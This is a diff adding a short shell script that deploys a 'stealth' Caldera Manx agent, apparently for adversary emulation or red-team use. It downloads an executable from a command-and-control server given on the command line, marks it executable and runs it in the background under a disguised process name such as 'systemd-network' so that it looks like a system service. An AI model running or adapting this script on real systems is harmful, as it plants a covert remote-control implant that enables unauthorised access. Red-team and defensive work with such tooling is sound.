@@ -1,0 +1,32 @@
+# 1. Assign command line arguments to variables
+# $1 = Caldera HTTP URL (e.g., https://c2.server.net)
+# $2 = Caldera Socket (e.g., tcp.c2.server.net:7010)
+# $3 = Agent process name (e.g., systemd-network)
+
+server2="$1"
+socket="$2"
+agent2="$3"
+contact="tcp"
+
+# Check if all three arguments were supplied
+if [ -z "$server2" ] || [ -z "$socket" ] || [ -z "$agent2" ]; then
+  echo "Usage: $0 <HTTP_URL> <Socket_Address> <Agent_Process_Name>"
+  echo "Example: $0 https://c2.server.net c2.server.net:7010 systemd-network"
+  exit 1
+fi
+
+echo "Deploying stealth Manx agent: $agent2"
+
+# 2. Download the Manx agent executable
+# Use quotes around variables to prevent issues with special characters
+curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server2"/file/download > "$agent2"
+
+# Check if download succeeded
+if [ $? -ne 0 ]; then
+    echo "❌ Failed to download agent from $server2"
+    exit 1
+fi
+
+chmod +x "$agent2"
+
+( exec -a "$agent2" "./$agent2" -http "$server2" -socket "$socket" -contact "$contact" -v ) &
